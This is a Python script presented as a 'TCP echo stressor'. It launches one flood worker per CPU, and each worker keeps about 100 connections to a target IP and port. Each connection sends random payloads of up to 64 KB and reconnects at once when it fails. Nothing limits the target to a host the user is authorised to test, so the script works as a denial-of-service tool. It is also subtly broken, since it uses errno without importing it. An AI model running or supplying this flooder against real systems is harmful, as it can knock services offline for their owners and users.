import socket
import multiprocessing
import time
import sys
import os
import random
import select

# Configurable constants
MIN_PAYLOAD = 64
MAX_PAYLOAD = 65536
RECV_TIMEOUT = 2.0  # seconds
RECONNECT_DELAY = 0.001  # 1ms

def set_socket_options(sock):
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024 * 1024)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1024 * 1024)
    sock.setblocking(False)  # Non-blocking for select()

def flood_worker(ip, port, duration):
    sockets = []
    sent_bytes = 0
    start_time = time.time()
    next_reconnect_check = start_time

    # Pre-generate random sizes for speed
    def rand_size():
        return random.randint(MIN_PAYLOAD, MAX_PAYLOAD)

    try:
        while time.time() - start_time < duration:
            now = time.time()

            # Periodically refresh dead sockets (every 100ms)
            if now >= next_reconnect_check:
                # Clean dead sockets & refill
                alive = []
                for s in sockets:
                    try:
                        # Quick check: is socket writable? (not perfect, but fast)
                        _, writable, _ = select.select([], [s], [], 0)
                        if writable:
                            alive.append(s)
                        else:
                            s.close()
                    except:
                        s.close()
                sockets = alive

                # Refill to CONNECTIONS_PER_WORKER
                while len(sockets) < 100:  # Tune this per worker
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        set_socket_options(s)
                        err = s.connect_ex((ip, port))
                        if err == 0 or err == errno.EINPROGRESS:
                            sockets.append(s)
                        else:
                            s.close()
                    except:
                        pass
                next_reconnect_check = now + 0.1

            if not sockets:
                time.sleep(0.01)
                continue

            # Shuffle to avoid bias
            random.shuffle(sockets)

            for s in sockets[:]:
                try:
                    # Generate random payload
                    size = rand_size()
                    payload = os.urandom(size)

                    # Send
                    sent = s.send(payload)
                    if sent > 0:
                        sent_bytes += sent

                        # Add tiny random delay (0 to 1 microsecond)
                        delay = random.random() * 0.000001  # 0–1µs
                        if delay > 0:
                            time.sleep(delay)

                        # Wait for echo response (non-blocking with timeout)
                        ready, _, _ = select.select([s], [], [], RECV_TIMEOUT)
                        if ready:
                            try:
                                resp = s.recv(65536)
                                # We don't care about content — just that server responded
                                if not resp:
                                    raise ConnectionResetError
                            except:
                                raise ConnectionResetError
                        else:
                            # Timeout = server overloaded or dead
                            raise TimeoutError

                except (ConnectionResetError, TimeoutError, OSError, BrokenPipeError):
                    # Reconnect this socket
                    try:
                        s.close()
                    except:
                        pass
                    sockets.remove(s)
                    # Immediate reconnect attempt
                    try:
                        ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        set_socket_options(ns)
                        err = ns.connect_ex((ip, port))
                        if err == 0 or err == errno.EINPROGRESS:
                            sockets.append(ns)
                        else:
                            ns.close()
                    except:
                        pass

    finally:
        for s in sockets:
            try:
                s.close()
            except:
                pass
        mb = sent_bytes / (1024 * 1024)
        print(f"[PID {os.getpid()}] Sent {mb:.2f} MB | Avg {mb/duration:.2f} MB/s")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python3 tcp_echo_max_stress.py <ip> <port> <time_seconds>")
        sys.exit(1)

    ip = sys.argv[1]
    port = int(sys.argv[2])
    duration = int(sys.argv[3])

    print(f"🔥 Launching TCP echo stressor to {ip}:{port} for {duration}s")
    print(f"   Features: random size ({MIN_PAYLOAD}-{MAX_PAYLOAD}), echo wait, micro-delays, auto-reconnect")

    procs = []
    for _ in range(multiprocessing.cpu_count()):
        p = multiprocessing.Process(target=flood_worker, args=(ip, port, duration))
        p.start()
        procs.append(p)

    try:
        for p in procs:
            p.join()
    except KeyboardInterrupt:
        print("\n[!] Stopping...")
        for p in procs:
            p.terminate()
        sys.exit(0)
